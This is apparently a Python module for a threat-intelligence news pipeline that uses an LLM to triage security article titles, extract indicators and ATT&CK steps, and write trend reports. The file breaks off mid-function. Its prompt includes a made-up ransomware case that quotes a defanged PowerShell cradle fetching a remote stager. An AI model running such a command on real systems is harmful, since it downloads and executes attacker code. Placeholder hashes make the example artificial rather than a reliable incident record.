import json
import logging
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

from config import load_config
from cost_tracker import cost_tracker
from database import get_unsummarized_articles, save_summary, get_articles_for_category, _format_entity_name
from llm_client import has_api_key, get_model_name, call_llm

logger = logging.getLogger(__name__)

RELEVANCE_PROMPT = """You are a cybersecurity threat-intelligence triage analyst.
Classify each article title as RELEVANT or IRRELEVANT to cybersecurity threat research.

RELEVANT — include if the article is about ANY of these:
  Malware analysis, exploits, vulnerabilities (CVEs), attack campaigns, threat actors/APTs,
  zero-days, supply chain attacks, security advisories, novel attack techniques or tooling,
  breach investigations with technical details, proof-of-concept exploits, offensive/defensive
  security tool releases, emerging security technologies, botnets, ransomware operations,
  exploit kits, C2 infrastructure, phishing campaigns, firmware/hardware security research.

IRRELEVANT — exclude if the article is ONLY about:
  Business/financial news, regulatory or legal actions, privacy policy changes, fines or lawsuits,
  mergers & acquisitions, product marketing, career/hiring, opinion without technical substance,
  awards, conference announcements, stock prices, executive appointments.

IMPORTANT: When in doubt, classify as RELEVANT. It is much better to include a borderline
article than to miss a genuine threat.

Titles:
{titles}

Respond with a JSON object: {{"relevant": [true, false, ...]}} — one boolean per title, same order."""

SUMMARY_PROMPT = r"""You are a senior cybersecurity threat intelligence analyst.
Given an article provided in the <article> element, produce a structured analysis as a JSON object
with these exact keys.

YOUR PRIMARY TASK IS EXTRACTION, NOT SUMMARIZATION. Do not condense the article into a brief
overview — capture every discrete technical fact. Treating a detail as "minor" and omitting
it is a failure mode. Be exhaustive. "Exhaustive" means no information is lost; it does NOT
mean repeating the same subject across many near-identical bullets — group such findings
(see CONSOLIDATION below).

CRITICAL: Preserve all technical specifics exactly as written in the article. None must be
omitted, generalized, or paraphrased.
If the article content appears sparse, fragmented, or contains unusual character sequences,
produce a best-effort analysis from whatever readable text is present — do not write
data-quality observations, encoding complaints, or placeholder text into any JSON field.

- "executive_summary": A concise paragraph (3-5 sentences) capturing the essence and
  significance of the threat, vulnerability, or finding. Be precise and informative.

- "details": A JSON array of strings. Each string is one technical finding from the
  article. Be EXHAUSTIVE but non-redundant — see CONSOLIDATION.

  For every article, actively scan for and extract each of the following when present:
  * Malware and tool family names, version strings, and build identifiers
  * CVE identifiers and CVSS scores
  * File names, full file paths, and file hashes (MD5 / SHA1 / SHA256)
  * Registry keys, mutex names, pipe names, and scheduled task names
  * Shell commands, PowerShell scripts, or code snippets — quote them exactly
  * Process names, service names, and DLL names involved in the attack
  * Network infrastructure: IP addresses, domains, URLs, ports, and protocols
  * C2 communication mechanisms: beacon interval, jitter, encryption, disguise profile
  * Encoding, obfuscation, packing, or anti-analysis techniques used by the malware
  * Persistence mechanisms: registry run keys, scheduled tasks, services, startup folders
  * Privilege escalation techniques and UAC bypass methods
  * Lateral movement tools and the methods used (pass-the-hash, Kerberoasting, etc.)
  * Credential access techniques and the specific credential stores targeted
  * Exfiltration tools, destination infrastructure, and data volume where stated
  * Ransom demand amounts, cryptocurrency, and negotiation portal details
  * Exact affected product names and their version strings
  * Targeted industries, geographies, and victim profiles
  * Timestamps, campaign dates, or observed activity timeframes
  * Attribution evidence: infrastructure overlap, code reuse, TTP fingerprints, cluster names
  * Quoted statistics, detection rates, infection counts, or impact metrics

  EXTRACTION RULES — follow these strictly:
  * Put genuinely distinct findings in separate bullets, but consolidate homogeneous
    findings into one bullet (see CONSOLIDATION below)
  * Never omit a finding because it seems minor; if the article states it, extract it
  * Preserve exact names, values, IDs, hashes, version strings, and commands verbatim
  * Coverage, not bullet count, is the goal: capture every specific from a detail-rich
    article, but do NOT split one relationship into many bullets to inflate the count, and
    do NOT merge unrelated facts to shrink it
  * The number of bullets must scale with what the article actually states; a short or thin
    article should yield only a few bullets. Do NOT fabricate, infer beyond the text, pad
    with generic background, or restate the executive summary as details to bulk up the list

  CONSOLIDATION — remove redundancy without losing any information:
  * When multiple findings share the same subject and action and differ only along one
    enumerable dimension (targets, sources, vectors, file types, etc.), express them as a
    SINGLE bullet that lists every value. Never drop any value.
  * Keep findings in separate bullets when they have different subjects or different
    actions, or when each value is an independent technical artifact carrying its own
    context (distinct hashes, CVEs, IPs, file paths, commands, version strings).
  * EXCEPTION to "different actions" above — same subject, multiple qualitative attributes:
    when several findings describe ONE shared subject and each merely states a static
    qualitative property of it (privileges required, attack complexity, exploitability /
    likelihood, severity, count of affected versions, etc.) rather than a distinct action it
    performs, join them into a SINGLE bullet with "and". Never apply this when a property is an
    independent technical artifact (hash, CVE, IP, file path, command, version string) — those
    stay in their own bullets.

    GOOD (consolidated, no information lost):
    - "Campaign targets developers through compromised npm publishing workflows and malicious package updates"
    - "Malware harvests API keys, cloud credentials, and SSH keys from developer systems"
    - "All three vulnerabilities require no user privileges and have low attack complexity"

    BAD (redundant — same subject/action repeated per item):
    - "Campaign targets developers through compromised npm publishing workflows"
    - "Campaign targets developers through malicious package updates"
    - "Malware harvests API keys from developer systems"
    - "Malware harvests cloud credentials from developer systems"
    - "Malware harvests SSH keys from developer systems"

    BAD (same subject split across separate attribute bullets — must be joined):
    - "All three vulnerabilities require no user privileges"
    - "All three vulnerabilities have low attack complexity"

    BAD (narrative / vendor-PR filler — carries no intelligence, must be dropped):
    - "By the following day after the vendor's claimed fix, new victims were still coming forward"
    - "The company reached out to affected users warning them of 'suspicious activity'"
    - "The company confirmed that steps have been taken to secure affected accounts"

  EXCLUDE — never place the following in "details" (they carry no threat-intelligence value,
  so dropping them is lossless):
  * Vendor or company PR or reassurance statements — e.g. "the company confirmed steps have been
    taken to secure accounts", "the vendor reached out to affected users", "the company takes
    security seriously". These describe communications, not threat artifacts.
  * Generic response or remediation announcements that name no specific technical action (no
    patch version, config change, detection rule, or concrete step). A genuine specific fix
    belongs in "mitigations" instead.
  * Narrative or chronological color that restates the situation without adding a new technical
    specific — e.g. "new victims were still coming forward the next day", "the issue remained
    unresolved for hours".
  * Journalistic framing, reactions, and opinion — these belong in "analyst_notes", not "details".

- "analyst_notes": A paragraph capturing the article author's expert opinions, analytical
  conclusions, and professional judgement — what they believe this means for the broader
  threat landscape, their assessment of severity or attribution, and any forward-looking
  observations. Focus on the analyst's voice and interpretation, not on facts already
  captured in "details". Leave empty string if no clear analyst opinion is expressed.

- "mitigations": A JSON array of strings. Each string is one actionable mitigation step or
  defensive recommendation; either as suggested by the article or based on your internal
  knowledge.

- "iocs": A JSON array of strings. Each string is one Indicator of Compromise explicitly
  mentioned in the article: IP addresses, domains, URLs, file hashes (MD5/SHA1/SHA256),
  file names, registry keys, mutexes, email addresses, or any other concrete artifact.
  Return an empty array [] if no IOCs are mentioned.

- "tags": A JSON array of 3-8 lowercase hyphenated tags. Always include at least one broad
  threat-category tag from this list: vulnerability, exploit, cve, malware, ransomware, trojan,
  infostealer, stealer, apt, threat-actor, phishing, credential-theft, data-breach, supply-chain,
  botnet, ddos, c2, iot, firmware. Then add specific tags such as malware family names, CVE IDs,
  targeted products, or affected vendors.

- "attack_flow": A JSON array representing the attack chain as ordered steps.
  Each step is an object with keys: "phase", "title", "description", "technique".
  - "phase" MUST be one of these official MITRE ATT&CK tactics (use exact spelling):
    "Reconnaissance", "Resource Development", "Initial Access", "Execution",
    "Persistence", "Privilege Escalation", "Defense Evasion", "Credential Access",
    "Discovery", "Lateral Movement", "Collection", "Command and Control",
    "Exfiltration", "Impact"
  - "title" should be the name of the specific MITRE ATT&CK technique used
    (e.g., "Spearphishing Attachment", "PowerShell", "OS Credential Dumping")
  - "technique" should be the MITRE ATT&CK technique ID if identifiable
    (e.g., "T1566.001", "T1059.001", "T1003"). Leave empty string if unknown.
  - "description" should explain how this step was used in the attack described
  If no attack sequence is described, return an empty array [].

Before generating your final answer, re-scan the article top to bottom and verify that every
technical detail has been captured in "details" or "iocs". Add any you missed.

--- EXAMPLE OF IDEAL EXTRACTION ---
The following shows the expected extraction quality for a detail-rich technical article.
Notice that every technical specific is captured and nothing is omitted, while homogeneous
findings are consolidated into single bullets. A shorter article would yield correspondingly
fewer bullets.

<article>
<title>BlackCat Ransomware Exploits CVE-2023-3519 in Citrix NetScaler to Breach Healthcare Network</title>
<content>
Researchers observed a BlackCat (ALPHV) ransomware campaign targeting US healthcare
organizations. The initial intrusion vector was CVE-2023-3519, a critical unauthenticated
remote code execution vulnerability (CVSS 9.8) in Citrix NetScaler ADC and Gateway, allowing
attackers to plant a webshell via a specially crafted HTTP request to unpatched appliances
running firmware versions prior to 13.1-49.13.

Within 30 minutes of initial access, the threat actor deployed a PHP webshell at
/var/netscaler/ns/var/vpn/bookmark/shell.php (MD5: a1b2c3d4e5f678900000000000000001). The
webshell was used to download a Cobalt Strike Beacon stager via PowerShell:
IEX (New-Object Net.WebClient).DownloadString('hxxp://185.220.101[.]47/stage.ps1').

The Beacon payload (SHA256: 9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a)
communicated with C2 at 185.220.101[.]47 over HTTPS port 443 using a 60-second beacon interval
with jitter. The malleable C2 profile masqueraded as Google Analytics traffic.

Lateral movement used PsExec renamed as svchost32.exe and WMI remote execution. Credentials were
harvested from LSASS memory using a modified Mimikatz variant
(SHA256: f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b). BloodHound
(SharpHound) was deployed at C:\Windows\Temp\sharphound.exe for AD enumeration.

Prior to encryption, 2.3 TB of patient data was exfiltrated via Rclone v1.63.0, configured at
C:\ProgramData\rclone\rclone.conf targeting a Mega.nz endpoint. The BlackCat payload
(SHA256: 0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c) ran via a scheduled
task named 'MicrosoftEdgeUpdateTaskMachineCore2', encrypting files with ChaCha20-Poly1305 and
appending the .alphv extension. The ransom note RECOVER-FILES.txt demanded $4.2M in Monero via
hxxp://alphvmmm27o3abo3r2m[.]onion.

The intrusion was attributed to affiliate cluster UNC4466 based on infrastructure overlap and
identical Cobalt Strike C2 profiles seen in three prior campaigns. Researchers note a shift from
financial services to healthcare targeting, driven by the sector's lower patch cadence.
</content>
</article>

IDEAL OUTPUT:
{
  "executive_summary": "A BlackCat (ALPHV) ransomware affiliate (UNC4466) compromised a US healthcare organization by exploiting CVE-2023-3519, a critical unauthenticated RCE in Citrix NetScaler ADC/Gateway (CVSS 9.8). The attacker deployed Cobalt Strike for C2, harvested domain credentials via modified Mimikatz, exfiltrated 2.3 TB of patient data via Rclone, then deployed BlackCat ransomware via scheduled task demanding $4.2M in Monero. Researchers attribute this to a deliberate sector pivot by UNC4466 exploiting healthcare's lower patch cadence.",
  "details": [
    "CVE-2023-3519 is an unauthenticated RCE in Citrix NetScaler ADC and Gateway with CVSS score 9.8",
    "Exploitation requires a specially crafted HTTP request; affects firmware versions prior to 13.1-49.13",
    "PHP webshell deployed at /var/netscaler/ns/var/vpn/bookmark/shell.php within 30 minutes of initial access",
    "Webshell MD5 hash: a1b2c3d4e5f678900000000000000001",
    "Cobalt Strike Beacon stager downloaded via PowerShell cradle: IEX (New-Object Net.WebClient).DownloadString('hxxp://185.220.101[.]47/stage.ps1')",
    "Cobalt Strike Beacon SHA256: 9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a",
    "C2 server: 185.220.101[.]47 over HTTPS port 443",
    "Beacon interval: 60 seconds with jitter",
    "Cobalt Strike malleable C2 profile masqueraded as Google Analytics traffic",
    "Lateral movement performed via PsExec (renamed as svchost32.exe) and WMI remote execution",
    "Modified Mimikatz variant used to harvest credentials from LSASS memory; SHA256: f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b",
    "Credential harvest targeted domain administrator accounts",
    "BloodHound (SharpHound) deployed at C:\\Windows\\Temp\\sharphound.exe for Active Directory enumeration",
    "2.3 TB of patient data exfiltrated prior to encryption",
    "Exfiltration tool: Rclone v1.63.0",
    "Rclone configured at C:\\ProgramData\\rclone\\rclone.conf targeting attacker-controlled Mega.nz storage",
    "BlackCat ransomware payload SHA256: 0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c",
    "Ransomware executed via scheduled task named 'MicrosoftEdgeUpdateTaskMachineCore2'",
    "BlackCat used ChaCha20-Poly1305 encryption with a per-file unique key",
    "Encrypted files received .alphv extension",
    "Ransom note filename: RECOVER-FILES.txt",
    "Ransom demand: $4.2M USD in Monero",
    "Negotiation portal: hxxp://alphvmmm27o3abo3r2m[.]onion",
    "Attribution to UNC4466 based on infrastructure overlap and identical Cobalt Strike C2 profiles across three prior campaigns",
    "Campaign represents a shift in targeting from financial services to healthcare"
  ],
  "analyst_notes": "Researchers assess UNC4466 deliberately pivoted to healthcare due to the sector's lower patch cadence and higher propensity to pay ransoms. The reuse of identical Cobalt Strike malleable C2 profiles across three campaigns suggests operational infrastructure reuse, creating a detection opportunity for defenders tracking this cluster.",
  "mitigations": [
    "Patch Citrix NetScaler ADC and Gateway to firmware 13.1-49.13 or later immediately to address CVE-2023-3519",
    "Audit Citrix appliances for webshells in /var/netscaler/ directories",
    "Block outbound connections to 185.220.101[.]47 and hunt for Cobalt Strike beacon patterns in network traffic",
    "Enable Credential Guard and restrict LSASS access to prevent Mimikatz-style credential dumping",
    "Block or alert on PsExec execution, especially with non-standard binary names",
    "Monitor for Rclone execution and large outbound transfers to cloud storage providers",
    "Audit scheduled tasks for entries masquerading as Microsoft update tasks",
    "Require MFA on domain administrator accounts to limit blast radius of credential theft"
  ],
  "iocs": [
    "185.220.101[.]47",
    "/var/netscaler/ns/var/vpn/bookmark/shell.php",
    "a1b2c3d4e5f678900000000000000001",
    "9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a",
    "f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b",
    "0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c",
    "C:\\Windows\\Temp\\sharphound.exe",
    "C:\\ProgramData\\rclone\\rclone.conf",
    "alphvmmm27o3abo3r2m[.]onion",
    "RECOVER-FILES.txt"
  ],
  "tags": ["ransomware", "blackcat", "alphv", "cve-2023-3519", "citrix-netscaler", "healthcare"],
  "attack_flow": [
    {
      "phase": "Initial Access",
      "title": "Exploit Public-Facing Application",
      "technique": "T1190",
      "description": "Exploited CVE-2023-3519 (CVSS 9.8) in unpatched Citrix NetScaler ADC/Gateway via unauthenticated RCE to deploy a PHP webshell at /var/netscaler/ns/var/vpn/bookmark/shell.php"
    },
    {
      "phase": "Execution",
      "title": "Command and Scripting Interpreter: PowerShell",
      "technique": "T1059.001",
      "description": "Used a PowerShell IEX download cradle via the webshell to fetch and execute a Cobalt Strike Beacon stager from 185.220.101[.]47"
    },
    {
      "phase": "Command and Control",
      "title": "Application Layer Protocol: Web Protocols",
      "technique": "T1071.001",
      "description": "Cobalt Strike Beacon beaconed over HTTPS to 185.220.101[.]47:443 every 60 seconds with jitter, using a malleable C2 profile impersonating Google Analytics"
    },
    {
      "phase": "Credential Access",
      "title": "OS Credential Dumping: LSASS Memory",
      "technique": "T1003.001",
      "description": "Modified Mimikatz variant dumped domain administrator credentials from LSASS memory"
    },
    {
      "phase": "Discovery",
      "title": "Domain Trust Discovery",
      "technique": "T1482",
      "description": "BloodHound (SharpHound) deployed at C:\\Windows\\Temp\\sharphound.exe to enumerate Active Directory for privilege escalation and lateral movement paths"
    },
    {
      "phase": "Lateral Movement",
      "title": "Remote Services: SMB/Windows Admin Shares",
      "technique": "T1021.002",
      "description": "PsExec (renamed svchost32.exe) and WMI remote execution used with harvested domain admin credentials to move across domain-joined machines"
    },
    {
      "phase": "Exfiltration",
      "title": "Exfiltration to Cloud Storage",
      "technique": "T1567.002",
      "description": "Rclone v1.63.0, configured via C:\\ProgramData\\rclone\\rclone.conf, exfiltrated 2.3 TB of patient data to attacker-controlled Mega.nz storage"
    },
    {
      "phase": "Impact",
      "title": "Data Encrypted for Impact",
      "technique": "T1486",
      "description": "BlackCat ransomware executed via scheduled task 'MicrosoftEdgeUpdateTaskMachineCore2', encrypting files with ChaCha20-Poly1305 and appending .alphv extension; RECOVER-FILES.txt demanded $4.2M in Monero"
    }
  ]
}
--- END EXAMPLE ---

The article to analyze is provided in the <article> element. Respond ONLY with valid JSON."""


def _is_rate_limit_error(exc):
    """Return True if the exception looks like a rate-limit (429) response."""
    name = type(exc).__name__
    msg = str(exc).lower()
    return name == "RateLimitError" or "429" in msg or "rate limit" in msg


def check_relevance(titles):
    """Batch-classify article titles for threat-research relevance via LLM.

    Sends titles in batches of 25 to the configured OpenAI model for
    binary classification. If the API key is not configured or a batch
    fails, all titles in that batch default to relevant.

    Args:
        titles: List of article title strings to classify.

    Returns:
        List of booleans, same length as ``titles``. True means the
        title is relevant to cybersecurity threat research.
    """
    if not titles:
        return []

    if not has_api_key():
        return [True] * len(titles)  # No API key → accept all

    results = []
    BATCH = 25

    for i in range(0, len(titles), BATCH):
        batch = titles[i : i + BATCH]
        numbered = "\n".join(f'{j + 1}. "{t}"' for j, t in enumerate(batch))
        prompt = RELEVANCE_PROMPT.format(titles=numbered)

        try:
            content, it, ot, cc, cr = call_llm(
                None,
                [{"role": "user", "content": prompt}],
                temperature=0,
                max_tokens=300,
                json_mode=True,
            )
            cost_tracker.add_tokens(it, ot, cc, cr)
            data = json.loads(content)
            batch_results = data.get("relevant", [True] * len(batch))
            # Pad if the model returned fewer entries than expected
            while len(batch_results) < len(batch):
                batch_results.append(True)
            results.extend(batch_results[: len(batch)])
        except Exception as e:
            logger.error(f"Relevance check failed for batch: {e}", exc_info=True)
            results.extend([True] * len(batch))  # Accept all on error

    return results


def _compose_markdown(data):
    """Build a markdown summary from structured LLM JSON output.

    Assembles sections for executive summary, details, analyst notes,
    mitigations, and IOCs into a single markdown string (mirrors the
    Android ``MarkdownComposer``).

    Args:
        data: Dictionary with keys ``executive_summary``, ``details``
            (list), ``analyst_notes`` (string), ``mitigations`` (list),
            and ``iocs`` (list).

    Returns:
        Formatted markdown string with headed sections.
    """
    sections = []

    sections.append("# Executive Summary")
    sections.append(data.get("executive_summary") or "No summary available.")
    sections.append("")

    sections.append("# Details")
    details = [str(p).strip() for p in data.get("details", []) if str(p).strip() and not str(p).strip().startswith("#")]
    if details:
        sections.extend(f"- {p}" for p in details)
    else:
        sections.append("No details available.")
    sections.append("")

    analyst_notes = (data.get("analyst_notes") or "").strip()
    if analyst_notes:
        sections.append("# Analyst Notes")
        sections.append(analyst_notes)
        sections.append("")

    sections.append("# Mitigations")
    mitigations = [str(p).strip() for p in data.get("mitigations", []) if str(p).strip() and not str(p).strip().startswith("#")]
    if mitigations:
        sections.extend(f"- {p}" for p in mitigations)
    else:
        sections.append("No mitigations listed.")

    iocs = [str(p).strip() for p in data.get("iocs", []) if str(p).strip()]
    if iocs:
        sections.append("")
        sections.append("# IOCs")
        sections.extend(f"- {p}" for p in iocs)

    return "\n".join(sections)


def summarize_article(title, content):
    """Summarize a single article using the OpenAI API.

    Sends the article title and content (truncated to 12,000 chars) to
    the configured model with a structured analysis prompt. Retries up
    to 3 times on rate limits or API errors.

    Args:
        title: The article headline.
        content: The full article text.

    Returns:
        A dict with keys ``summary`` (markdown string), ``tags``
        (list of strings), ``attack_flow`` (list of phase dicts), and
        ``raw_data`` (the parsed LLM JSON). Returns None if the API key
        is missing or all retries fail.
    """
    if not has_api_key():
        logger.warning("LLM API key not configured, skipping summarization")
        return None

    # Truncate content to stay within token limits
    max_chars = 20000
    if len(content) > max_chars:
        content = content[:max_chars] + "\n\n[Content truncated...]"

    # Strip control characters (null bytes, form feeds, etc.) that cause some models
    # to treat the content as binary-corrupted. Preserves \t, \n, \r.
    content = "".join(
        ch for ch in content
        if not (ord(ch) <= 8 or 11 <= ord(ch) <= 12 or 14 <= ord(ch) <= 31 or ord(ch) == 127)
    )

    user_message = f"<article>\n<title>{title}</title>\n<content>\n{content}\n</content>\n</article>"

    for attempt in range(3):
        try:
            content_str, it, ot, cc, cr = call_llm(
                SUMMARY_PROMPT,
                [{"role": "user", "content": user_message}],
                temperature=0.3,
                max_tokens=12000,
                json_mode=True,
            )
            cost_tracker.add_tokens(it, ot, cc, cr)
            result = json.loads(content_str)
            tags = result.get("tags", [])
            result["tags"] = tags
            summary_md = _compose_markdown(result)

            return {
                "summary": summary_md,
                "tags": tags,
                "attack_flow": result.get("attack_flow", []),
                "raw_data": result,
            }

        except Exception as e:
            if _is_rate_limit_error(e):
                wait = 2 ** (attempt + 1)
                logger.warning(f"Rate limited, waiting {wait}s before retry")
                time.sleep(wait)
            elif attempt < 2:
                logger.error(f"Summarization error (attempt {attempt + 1}): {e}", exc_info=True)
                time.sleep(1)
            else:
                logger.error(f"All summarization retries failed: {e}", exc_info=True)
                return None

    return None


TREND_FORECAST_PROMPT = """You are a senior cybersecurity threat-intelligence strategist.

You are given a set of recent threat-intelligence article summaries, all belonging to the
category "{category}".

Produce a JSON object with exactly two keys:

1. "trend" — A concise analysis (3-6 paragraphs of markdown) of how this threat category is
   evolving right now. Cover:
   * Evolving TTPs (tactics, techniques, and procedures)
   * New tools, malware families, or infrastructure being adopted
   * Shifts in targeting (industries, geographies, victim profiles)
   * Notable behavioral changes compared to earlier activity

2. "forecast" — A forward-looking assessment (2-4 paragraphs of markdown) predicting where
   this category is headed over the next 3-6 months. Cover:
   * Most likely developments and escalation paths
   * Emerging risks defenders should prepare for
   * Recommended priority areas for security teams

Use markdown formatting (headings, bold, bullet lists) to make the text scannable.
Be specific and cite patterns from the provided articles.
Respond ONLY with valid JSON."""


def estimate_insight_cost(article_count, model):
    """Estimate the LLM cost for a single-pass category insight (forecast) run.

    Mirrors the Android ``estimateInsightCost``: the article lines are sent in a
    single request (input capped at ~5,000 tokens) with a fixed output budget.

    Args:
        article_count: Number of articles that will be included.
        model: Model name string.

    Returns:
        Estimated cost in USD as a float.
    """
    from cost_tracker import _lookup_pricing
    inp_price, _cached_price, out_price = _lookup_pricing(model)
    est_input = min(article_count * 200, 5000) + 200
    return (est_input * inp_price + 2000 * out_price) / 1_000_000


def estimate_trend_cost(articles, model):
    """Estimate the LLM cost for a full trend analysis run.

    Args:
        articles: List of article dicts (used to compute quarter groups).
        model: Model name string.

    Returns:
        Tuple of (estimated_cost_usd, n_quarters, n_years).
    """
    from cost_tracker import _lookup_pricing
    inp_price, _cached_price, out_price = _lookup_pricing(model)
    groups = _group_by_quarter(articles)
    n_quarters = len(groups)
    n_years = len({year for (year, _) in groups})
    # Batch summaries are needed when any quarter has >50 articles
    n_batches = sum(max(0, (len(q_arts) - 1) // 50) for q_arts in groups.values())
    total_input = n_quarters * 3000 + n_years * 8000 + n_batches * 15000
    total_output = n_quarters * 2500 + n_years * 3000 + n_batches * 1500
    cost = (total_input * inp_price + total_output * out_price) / 1_000_000
    return cost, n_quarters, n_years


def generate_category_insight(category_name, subcategory_tag=None, since_days=None):
    """Generate trend analysis and forecast for a threat category.

    Retrieves all summarized articles for the given category (and
    optionally a subcategory entity), then asks the LLM to produce a
    trend analysis and forward-looking forecast in a single pass
    (mirrors the Android ``GenerateCategoryInsightUseCase``).

    Args:
        category_name: Broad category name (e.g. ``"Malware"``).
        subcategory_tag: Optional entity tag to narrow the focus
            (e.g. ``"lockbit"``).
        since_days: If set, only include articles from the last N days.

    Returns:
        A dict with keys ``trend`` (markdown), ``forecast`` (markdown),
        ``article_count`` (int), and ``model_used`` (str). Returns None
        if fewer than 3 articles are available or the API key is missing.
    """
    if not has_api_key():
        logger.warning("LLM API key not configured, skipping insight generation")
        return None

    articles = get_articles_for_category(category_name, subcategory_tag=subcategory_tag, since_days=since_days)
    if len(articles) < 3:
        return None

    # Build context label for the prompt
    if subcategory_tag:
        display_name = _format_entity_name(subcategory_tag)
        context_label = f"{category_name} > {display_name}"
    else:
        context_label = category_name

    # Build input: title + date + executive summary extract, one line per article.
    lines = []
    for art in articles:
        date_str = art.get("published_date") or "unknown date"
        summary = art.get("summary_text") or ""
        match = re.search(r"# Executive Summary\s*\n([\s\S]*?)(?=\n#|\n*$)", summary, re.IGNORECASE)
        exec_match = match.group(1).strip() if match else summary[:500]
        lines.append(f"- **{art['title']}** ({date_str}): {exec_match}")

    input_text = "\n".join(lines)
    if len(input_text) > _INSIGHT_MAX_CHARS:
        input_text = input_text[:_INSIGHT_MAX_CHARS] + "\n\n[Truncated...]"

    system_prompt = TREND_FORECAST_PROMPT.format(category=context_label)
    user_message = f"Category: {context_label}\nArticle count: {len(articles)}\n\n{input_text}"

    analysis = None
    for attempt in range(3):
        try:
            content, it, ot, cc, cr = call_llm(
                system_prompt,
                [{"role": "user", "content": user_message}],
                temperature=0.4,
                max_tokens=2000,
                json_mode=True,
            )
            cost_tracker.add_tokens(it, ot, cc, cr)
            parsed = json.loads(content)
            analysis = {
                "trend": parsed.get("trend", ""),
                "forecast": parsed.get("forecast", ""),
            }
            break
        except Exception as e:
            if _is_rate_limit_error(e):
                wait = 2 ** (attempt + 1)
                logger.warning(f"Rate limited, waiting {wait}s before retry")
                time.sleep(wait)
            elif attempt < 2:
                logger.error(f"Insight generation error (attempt {attempt + 1}): {e}")
                time.sleep(1)
            else:
                logger.error(f"All insight retries failed: {e}")
                return None

    if analysis is None:
        return None

    return {
        "trend": analysis["trend"],
        "forecast": analysis["forecast"],
        "article_count": len(articles),
        "model_used": get_model_name(),
    }


# ============================================================
# Historical Trend Analysis (quarterly + yearly time-series)
# ============================================================

BATCH_SUMMARY_PROMPT = """You are a senior cybersecurity threat intelligence analyst.
Summarize the key cybersecurity themes from these {category} articles into a concise overview.
Focus on: common attack patterns, notable threat actors, affected sectors, and emerging techniques.
Produce a JSON object with one key:
- "trend": A concise summary (2-3 paragraphs of markdown) of the main themes.
Respond ONLY with valid JSON."""

QUARTERLY_TREND_FIRST_PROMPT = """You are a senior cybersecurity threat-intelligence strategist.
Analyze cybersecurity trends in {category} for {period} based on {count} articles.
Produce a JSON object with exactly three keys:
- "trend": A detailed analysis (3-5 paragraphs of markdown) of how threats in this category evolved during this quarter.
- "key_developments": A JSON array of 3-7 strings, each a concise bullet describing a key development.
- "outlook": A forward-looking paragraph on what to expect next quarter based on these trends.
Use markdown formatting. Be specific and cite patterns from the provided summaries.
Respond ONLY with valid JSON."""

QUARTERLY_TREND_SUBSEQUENT_PROMPT = """You are a senior cybersecurity threat-intelligence strategist.
Analyze cybersecurity trends in {category} for {period} based on {count} articles.

Previous quarter's trend analysis:
{prev_trend}

Produce a JSON object with exactly three keys:
- "trend": A detailed analysis (3-5 paragraphs of markdown) of how threats evolved this quarter. Explicitly compare and correlate with the previous quarter's trends — what continued, what changed, what's new.
- "key_developments": A JSON array of 3-7 strings, each a concise bullet describing a key development.
- "outlook": A forward-looking paragraph on what to expect next quarter based on observed trajectory.
Use markdown formatting. Be specific and cite patterns from the provided summaries.
Respond ONLY with valid JSON."""

YEARLY_TREND_FIRST_PROMPT = """You are a senior cybersecurity threat-intelligence strategist.
Synthesize these quarterly analyses for {category} in {year} into a comprehensive yearly trend report.

{quarterly_summaries}

Produce a JSON object with exactly three keys:
- "trend": A comprehensive yearly analysis (4-6 paragraphs of markdown) synthesizing all quarters. Identify overarching themes, major shifts, and year-defining developments.
- "key_developments": A JSON array of 5-10 strings, each a concise bullet describing the year's most significant developments.
- "outlook": A forward-looking assessment (2-3 paragraphs) predicting where this category is headed in the coming year.
Use markdown formatting. Be specific.
Respond ONLY with valid JSON."""

YEARLY_TREND_SUBSEQUENT_PROMPT = """You are a senior cybersecurity threat-intelligence strategist.
Synthesize these quarterly analyses for {category} in {year} into a comprehensive yearly trend report.

{quarterly_summaries}

Previous year's trend analysis:
{prev_trend}

Produce a JSON object with exactly three keys:
- "trend": A comprehensive yearly analysis (4-6 paragraphs of markdown) synthesizing all quarters. Explicitly compare with the previous year — what intensified, what declined, what emerged as new.
- "key_developments": A JSON array of 5-10 strings, each a concise bullet describing the year's most significant developments.
- "outlook": A forward-looking assessment (2-3 paragraphs) predicting where this category is headed in the coming year based on multi-year trajectory.
Use markdown formatting. Be specific.
Respond ONLY with valid JSON."""

_EXEC_SUMMARY_RE = re.compile(r"# Executive Summary\s*\n([\s\S]*?)(?=\n#|\n*$)", re.IGNORECASE)
_TREND_BATCH_SIZE = 50
_TREND_MAX_SUMMARY_CHARS = 300
_INSIGHT_MAX_CHARS = 20_000


def _group_by_quarter(articles):
    """Group articles into a dict keyed by (year, quarter) tuples, sorted."""
    groups = {}
    for art in articles:
        pub = art.get("published_date")
        if not pub:
            continue
        try:
            dt = datetime.fromisoformat(pub)
        except (ValueError, TypeError):
            continue
        quarter = (dt.month - 1) // 3 + 1
        key = (dt.year, quarter)
        groups.setdefault(key, []).append(art)
    return dict(sorted(groups.items()))


def _extract_trend_summary(article, max_chars=_TREND_MAX_SUMMARY_CHARS):
    """Extract executive summary or fallback to first max_chars of summary_text."""
    summary = article.get("summary_text") or ""
    match = _EXEC_SUMMARY_RE.search(summary)
    text = match.group(1).strip() if match else summary[:max_chars]
    return text[:max_chars]


def _compute_trend_hash(articles):
    """Compute a 16-char SHA-256 hash over sorted (id, summary_length) pairs."""
    import hashlib
    tuples = sorted((art["id"], len(art.get("summary_text") or "")) for art in articles)
    digest = hashlib.sha256(str(tuples).encode()).hexdigest()
    return digest[:16]


def _format_trend_result(parsed):
    """Format JSON trend result into a single markdown string."""
    parts = [parsed.get("trend", "").strip()]
    key_devs = parsed.get("key_developments", [])
    if key_devs:
        parts.append("\n**Key Developments:**")
        parts.extend(f"- {d}" for d in key_devs)
    outlook = (parsed.get("outlook") or "").strip()
    if outlook:
        parts.append("\n**Outlook:**")
        parts.append(outlook)
    return "\n".join(parts).strip()


def _summarize_batch(category_name, batch_text):
    """Condense a batch of article summaries via LLM. Returns trend string or None."""
    prompt = BATCH_SUMMARY_PROMPT.replace("{category}", category_name)
    try:
        content, it, ot, cc, cr = call_llm(
            prompt,
            [{"role": "user", "content": batch_text}],
